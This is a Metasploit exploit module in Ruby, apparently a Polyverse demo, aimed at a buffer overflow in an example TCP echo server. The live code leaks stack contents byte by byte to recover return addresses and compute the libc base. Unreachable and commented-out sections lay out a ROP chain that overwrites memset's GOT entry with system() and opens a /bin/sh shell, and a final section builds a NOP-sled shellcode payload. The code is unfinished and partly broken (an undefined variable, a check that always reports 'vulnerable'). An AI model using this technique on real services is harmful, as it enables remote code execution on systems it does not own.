##
# This module requires Metasploit
##

require "test/unit"
require "base64"

class MetasploitModule < Msf::Exploit::Remote
	Rank = ManualRanking

	include Msf::Exploit::Remote::Tcp

def initialize(info = {})
	super(
		update_info(
			info,
			'Name'           => 'Polyverse tcp_echo_server example',
			'Description'    => 'This is a module for exploiting a buffer overflow in tcp_echo_server',
			'Author'         => 'Polyverse Corp.',
			'References'     =>
			[
				[ 'URL', 'https://polyverse.io' ],
			],
			'Platform'       => 'linux',
			'Payload'        => {},
			'Arch'           => [ARCH_X64],
			'Targets'        => 
			[
				[
					'Linux x64',
					{
						'Arch'   => ARCH_X64,
						'Ret'    => 0x7fffffffffff
					}
				]
			],
 			'DefaultTarget'  => 0
		)
	)
    
	register_options(
	[
		OptString.new('NOP', [true, 'NOP Byte Code (probably should get this from ARCH)', "\x90"]),
		OptInt.new('PREPAD', [true, 'Number of NOP instructions before payload', 100]), # Should be at least 16
		OptInt.new('POSTPAD', [true, 'Number of NOP instructions after payload', 100])
	])
end

# Returns that the remote host is always vulnerable
def check
	print_status("def check...")
	return Exploit::CheckCode::Vulnerable
end

def exploit
	print_status("start exploit...")

	lcsmr_off  = 0x0000f5            # main return-to offset in __libc_start_main
	lcsm_off   = 0x021e50            # __libc_start_main()'s offset in libc.so.6

	# Leak the next n characters
	def probe(n, buf)
		str = ""
		for i in 1..n
			connect
			sock.write buf 
			sleep 0.5
			buf = sock.read(buf.length+1)
			disconnect
		end
		return buf[-n, n], buf
	end

	# Presently, this converter assumes little-endian
	def as_uint(str)
		n = 0
		for i in 1..str.length
			if Rex::Arch.endian(target.arch) == ENDIAN_LITTLE
				n = (n << 8) + str[str.length - i].ord
			else
				n = (n << 8) + str[i - 1].ord
			end
		end

		return n
	end

	# Start looking beyond the 80 byte buffer
	buf = "01234567890123456789012345678901234567890123456789012345678901234567890123456789"

	# vuln_padding
	vuln_padding_str, buf = probe(12, buf)
	vuln_padding = as_uint(vuln_padding_str)
	p "vuln_padding_str", vuln_padding_str.unpack('H*'), vuln_padding.to_s(16), ""

	# vuln_n
	vuln_n_str, buf = probe(4, buf)
	vuln_n = as_uint(vuln_n_str)
	p "vuln_n_str", vuln_n_str.unpack('H*'), vuln_n.to_s(16), ""

	# vuln_save_bp
	vuln_saved_bp_str, buf = probe(8, buf)
	vuln_saved_bp = as_uint(vuln_saved_bp_str)
	p "vuln_saved_bp_str", vuln_saved_bp_str.unpack('H*'), vuln_saved_bp.to_s(16), ""

	# vuln_ret_addr
	vuln_ret_addr_str, buf = probe(8, buf)
	vuln_ret_addr = as_uint(vuln_ret_addr_str)
	p "vuln_ret_addr_str:", vuln_ret_addr_str.unpack('H*'), vuln_ret_addr.to_s(16), ""

	# main_argv_save
	main_argv_save_str, buf = probe(8, buf)
	main_argv_save = as_uint(main_argv_save_str)
	p "main_argv_save_str", main_argv_save_str.unpack('H*'), main_argv_save.to_s(16), ""

	# main_padding
	main_padding_str, buf = probe(4, buf)
	main_padding = as_uint(main_padding_str)
	p "main_padding_str", main_padding_str.unpack('H*'), main_padding.to_s(16), ""

	# main_argc_save
	main_argc_save_str, buf = probe(4, buf)
	main_argc_save = as_uint(main_argc_save_str)
	p "main_argc_save_str", main_argc_save_str.unpack('H*'), main_argc_save.to_s(16), ""

	# main_client_addr
	main_client_addr_str, buf = probe(16, buf)
	p "main_client_addr_str", main_client_addr_str.unpack('H*'), ""

	# main_server_addr
	main_server_addr_str, buf = probe(16, buf)
	p "main_server_addr_str", main_server_addr_str.unpack('H*'), ""

	# main_cli_len
	main_cli_len_str, buf = probe(4, buf)
	main_cli_len = as_uint(main_cli_len_str)
	p "main_cli_len_str", main_cli_len_str.unpack('H*'), main_cli_len.to_s(16), ""

	# main_client_fd
	main_client_fd_str, buf = probe(4, buf)
	main_client_fd = as_uint(main_client_fd_str)
	p "main_client_fd_str", main_client_fd_str.unpack('H*'), main_client_fd.to_s(16), ""

	# main_server_fd
	main_server_fd_str, buf = probe(4, buf)
	main_server_fd = as_uint(main_server_fd_str)
	p "main_server_fd_str", main_server_fd_str.unpack('H*'), main_server_fd.to_s(16), ""

	# main_server_port
	main_server_port_str, buf = probe(4, buf)
	main_server_port = as_uint(main_server_port_str)
	p "main_server_port_str", main_server_port_str.unpack('H*'), main_server_port.to_s(16), ""

	# The next location is mains saved frame pointer (BP)
	main_saved_bp_str, buf = probe(8, buf)
	main_saved_bp = as_uint(main_saved_bp_str)
	p "main_saved_bp_str", main_saved_bp_str.unpack('H*'), main_saved_bp.to_s(16), ""

	# The next location is main callers return address (glib main)
	main_ret_addr_str, buf = probe(8, buf)
	main_ret_addr = as_uint(main_ret_addr_str)
	p "main_ret_addr_str:", main_ret_addr_str.unpack('H*'), main_ret_addr.to_s(16), ""

	libc_base = main_ret_addr - lcsmr_off - lcsm_off
	p "libc_base:", libc_base.to_s(16)

	return

	# IGNORE EVERYTHING PAST THIS POINT FOR NOW
	
#	write_plt  = 0x4006c0            # address of write@plt
#	htons_plt  = 0x4006d0            # address of htons@plt
#	printf_plt = 0x4006e0            # (For completeness)
#	memset_plt = 0x4006f0            # address of memset@plt
#	close_plt  = 0x400700            # address of close@plt
#	read_plt   = 0x400710            # address of read@plt
#	cmain_plt  = 0x400720            # address of __libc_start_main@plt
#	cstart_plt = 0x400730            # address of __gmon_start__
#	listen_plt = 0x400740            # address of listen@plt
#	bind_plt   = 0x400750            # address of bind@plt
#	accept_plt = 0x400760	         # address of accept@plt
#	exit_plt   = 0x400770            # address of exit@plt
#	fwrite_plt = 0x400780            # address of fwrite@plt
#	socket_plt = 0x400790            # address of socket@plt
#	memset_got = 0x602030            # memset()'s GOT entry
#	memset_off = 0x08c8d0            # memset()'s offset in libc.so.6
#	system_off = 0x046590            # system()'s offset in libc.so.6
#	pop3ret    = 0x400b18            # gadget to pop rdi; pop rsi; pop rdx; ret
#	writeable  = 0x600000            # address of some writable space

	#buf += [pop3ret].pack("<Q")     # pop args into registers
	#buf += pack("<Q", 0x4)          # client_fd
	#buf += pack("<Q", memset_got)   # address to read from
	#buf += pack("<Q", 0x8)          # number of bytes to write to stdout
	#buf += pack("<Q", write_plt)    # return to write@plt
	#probe(buf.length, buf)

	# The next location is the target return address
	ret_addr_str, buf = probe(8, buf)
	ret_addr = as_uint(ret_addr_str)
	p "ret_addr_str:", ret_addr_str, ret_addr.to_s(16)

	p "before", buf
	buf[-8, 8] = [pop3ret].pack("<Q")
	p "after", buf

	buf += [0x4].pack("<Q")          # client_fd
	buf += [memset_got].pack("<Q")   # address to read from
	buf += [0x8].pack("<Q")          # number of bytes to write to stdout
	buf += [write_plt].pack("<Q")    # return to write@plt
	p "after 2", buf
	probe(1, buf)
	p "after 3", buf
	                                # which is the last 8 bytes in the reply

	# memset_addr = unpack("<Q", d)
	# print "memset() is at", hex(memset_addr[0])
	#

	## leak memset()'s libc address using write@plt
	#buf = ""
	#buf += "A"*168                  # padding to RIP's offset
	#buf += pack("<Q", pop3ret)      # pop args into registers
	#buf += pack("<Q", 0x1)          # stdout
	#buf += pack("<Q", memset_got)   # address to read from
	#buf += pack("<Q", 0x8)          # number of bytes to write to stdout
	#buf += pack("<Q", write_plt)    # return to write@plt
	#
	## payload for stage 1: overwrite memset()'s GOT entry using read@plt
	#buf += pack("<Q", pop3ret)      # pop args into registers
	#buf += pack("<Q", 0x0)          # stdin
	#buf += pack("<Q", memset_got)   # address to write to
	#buf += pack("<Q", 0x8)          # number of bytes to read from stdin
	#buf += pack("<Q", read_plt)     # return to read@plt
	#
	## payload for stage 2: read "/bin/sh" into 0x601000 using read@plt
	#buf += pack("<Q", pop3ret)      # pop args into registers
	#buf += pack("<Q", 0x0)          # junk
	#buf += pack("<Q", writeable)    # location to write "/bin/sh" to
	#buf += pack("<Q", 0x8)          # number of bytes to read from stdin
	#buf += pack("<Q", read_plt)     # return to read@plt
	#
	## payload for stage 3: set RDI to location of "/bin/sh", and call system()
	#buf += pack("<Q", pop3ret)      # pop rdi; ret
	#buf += pack("<Q", writeable)    # address of "/bin/sh"
	#buf += pack("<Q", 0x1)          # junk
	#buf += pack("<Q", 0x1)          # junk
	#buf += pack("<Q", memset_plt)   # return to memset@plt which is actually system() now
	#
	#s = socket(AF_INET, SOCK_STREAM)
	#s.connect(("127.0.0.1", 2323))
	#
	## stage 1: overwrite RIP so we return to write@plt to leak memset()'s libc address
	#print s.recv(1024)              # "Enter input" prompt
	#s.send(buf + "\n")              # send buf to overwrite RIP
	#print s.recv(1024)              # receive server reply
	#d = s.recv(1024)[-8:]           # we returned to write@plt, so receive the leaked memset() libc address
	#                                # which is the last 8 bytes in the reply
	#
	#                                memset_addr = unpack("<Q", d)
	#                                print "memset() is at", hex(memset_addr[0])
	#
	#                                libc_base = memset_addr[0] - memset_off
	#                                print "libc base is", hex(libc_base)
	#
	#                                system_addr = libc_base + system_off
	#                                print "system() is at", hex(system_addr)
	#
	#                                # stage 2: send address of system() to overwrite memset()'s GOT entry
	#                                print "sending system()'s address", hex(system_addr)
	#                                s.send(pack("<Q", system_addr))
	#
	#                                # stage 3: send "/bin/sh" to writable location
	#                                print "sending '/bin/sh'"
	#                                s.send("/bin/sh")
	#
	#                                # get a shell
	#                                t = telnetlib.Telnet()
	#                                t.sock = s
	#                                t.interact()
	#
	exit

    # First approximation of where we should return to
    ret = target.ret					# Base address of "ret" when passed a single character
    ret += 7 + 17 + 8					# Location immediately after "owned" return address
    ret += datastore['PREPAD'] / 2			# Move halfway into the pre-NOP-sled we're about to build

    # Build the payload that delivers the goods
    p = "a" * 17					# "Owned" return address is at 18..25 in the message
    p += Rex::Arch.pack_addr(target.arch, ret)		# The contents will be backpatched later
    p += datastore['NOP'] * datastore['PREPAD']		# Build a NOP sled before our shellcode
    p += payload.encoded				# Sandwich the shellcode here
    p += datastore['NOP'] * datastore['POSTPAD']	# Build a NOP sled after the shellcode (n/a right now)
    if (p.length % 3) == 0 then b += 'b' end		# Guarantee a trailing "=" after base64 encoding

    # Proceed as if this is the final payload
    print_status("p: #{p} (Length: #{p.length})")
    p64 = Base64.strict_encode64(p)			# Encode payload in base64
    print_status("p64: #{p64} (Length: #{p64.length})")

    # Deal with the side-effect of the payload size
    ret -= p64.length / 16 * 16				# Location moves based on payload size which we now know
    p[17..24] = Rex::Arch.pack_addr(target.arch, ret)	# We should be very close to the middle of the NOP sled again

    # Finalize the payload (should be the same size)
    print_status("p: #{p} (Length: #{p.length})")
    p64 = Base64.strict_encode64(p)			# Re-encode payload in base64
    print_status("p64: #{p64} (Length: #{p64.length})")

#   res = send_request_raw({'uri'=>'/index.php?q=x'})

    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path,"index.php"),
      'method'    => 'POST',
      'vars_post' => {
      'q' => p64
      }
    })

    print_status("#{res}")
    print_status("done exploit....")
  end
end
